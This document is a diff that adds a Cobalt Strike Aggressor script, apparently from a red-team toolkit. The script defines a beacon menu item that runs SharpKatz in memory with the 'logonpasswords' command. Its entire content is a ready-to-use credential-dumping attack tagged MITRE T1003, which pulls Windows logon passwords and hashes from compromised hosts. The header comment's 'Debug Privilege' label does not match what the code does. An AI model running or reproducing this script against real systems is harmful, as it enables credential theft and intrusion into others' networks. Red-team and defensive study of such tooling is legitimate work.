@@ -1,0 +1,14 @@
+# SharpKatz Debug Privilege
+item "SharpKatz Logon Passwords  - T1003"{
+	local('$bid');
+		foreach $bid ($1){
+			sklogonpasswords($bid);
+		}
+	}
+	
+sub sklogonpasswords{
+
+bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command logonpasswords");
+
+}
+	
